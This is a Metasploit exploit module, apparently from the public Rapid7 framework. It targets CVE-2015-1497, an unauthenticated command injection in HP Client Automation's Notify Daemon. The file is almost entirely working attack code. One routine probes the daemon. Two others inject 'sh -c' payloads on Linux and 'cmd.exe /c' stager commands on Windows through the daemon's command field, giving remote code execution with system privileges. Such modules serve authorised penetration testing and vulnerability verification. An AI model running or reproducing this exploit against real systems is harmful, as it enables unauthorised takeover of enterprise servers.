# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = GreatRanking
 
  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::CmdStager
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;HP Client Automation Command Injection&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a command injection vulnerability on HP Client Automation, distributed
        actually as Persistent Systems Client Automation. The vulnerability exists in the Notify
        Daemon (radexecd.exe), which doesn&#039;t authenticate execution requests by default neither.
        This module has been tested successfully on HP Client Automation 9.00 over Windows 2003 SP2
        and CentOS 5.
      },
      &#039;Author&#039;         =>
        [
          &#039;Ben Turner&#039;, # Vulnerability discovery
          &#039;juan vazquez&#039; # Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2015-1497&#039;],
          [&#039;ZDI&#039;, &#039;15-038&#039;],
          [&#039;URL&#039;, &#039;https://radiasupport.accelerite.com/hc/en-us/articles/203659814-Accelerite-releases-solutions-and-best-practices-to-enhance-the-security-for-RBAC-and-Remote-Notify-features&#039;]
        ],
      &#039;Privileged&#039;     => true,
      &#039;Platform&#039;       => %w{ unix win },
      &#039;DefaultOptions&#039; =>
        {
            &#039;WfsDelay&#039; => 10
        },
      &#039;Payload&#039;        => {&#039;DisableNops&#039; => true},
      &#039;Targets&#039;        =>
        [
          [ &#039;HP Client Automation 9.0.0 / Linux&#039;,
            {
              &#039;Platform&#039; => &#039;unix&#039;,
              &#039;Arch&#039;     => ARCH_CMD,
              &#039;Payload&#039;  =>
                {
                  &#039;Space&#039;       => 466,
                  &#039;EncoderType&#039; => Msf::Encoder::Type::CmdUnixPerl,
                  &#039;Compat&#039;      =>
                    {
                      &#039;PayloadType&#039; => &#039;cmd&#039;,
                      &#039;RequiredCmd&#039; => &#039;openssl telnet generic gawk&#039;
                    },
                  &#039;BadChars&#039; => "\x27"
                }
            }
          ],
          [ &#039;HP Client Automation 9.0.0 / Windows&#039;,
            {
              &#039;Platform&#039; => &#039;win&#039;,
              &#039;Arch&#039;     => ARCH_X86
            }
          ]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Jan 02 2014&#039;))
 
    register_options(
      [
        Opt::RPORT(3465)
      ], self.class)
 
    deregister_options(&#039;CMDSTAGER::FLAVOR&#039;)
    deregister_options(&#039;CMDSTAGER::DECODER&#039;)
  end
 
  def check
    connect
    sock.put("\x00") # port
    sock.put("#{rand_text_alphanumeric(4 + rand(3))}\x00") # user ID
    sock.put("#{rand_text_alpha(4 + rand(3))}\x00") # password
    sock.put("hide\x00") # command
    res = sock.get_once
    disconnect
 
    if res && res.unpack(&#039;C&#039;)[0] == 0
      return Exploit::CheckCode::Detected
    end
 
    Exploit::CheckCode::Safe
  end
 
  def exploit
    case target[&#039;Platform&#039;]
    when &#039;win&#039;
      print_status(&#039;Exploiting Windows target...&#039;)
      execute_cmdstager({:flavor => :vbs, :linemax => 290})
    when &#039;unix&#039;
      print_status(&#039;Exploiting Linux target...&#039;)
      exploit_unix
    else
      fail_with(Failure::NoTarget, &#039;Invalid target&#039;)
    end
  end
 
  def exploit_unix
    connect
    sock.put("\x00") # port
    sock.put("0\x00") # user ID
    sock.put("#{rand_text_alpha(4 + rand(3))}\x00") # password
    sock.put("hide hide\x09sh -c &#039;#{payload.encoded.gsub(/\\/, "\\\\\\\\")}&#039;\x00") # command, here commands can be injected
    disconnect
  end
 
  def execute_command(cmd, opts = {})
    connect
    sock.put("\x00") # port
    sock.put("S-1-5-18\x00") # user ID
    sock.put("#{rand_text_alpha(4 + rand(3))}\x00") # password
    sock.put("hide hide\"\x09\"cmd.exe /c #{cmd}&\"\x00") # command, here commands can be injected
    res = sock.get_once
    disconnect
    unless res && res.unpack(&#039;C&#039;)[0] == 0
      fail_with(Failure::Unknown, "Something failed executing the stager...")
    end
  end
end

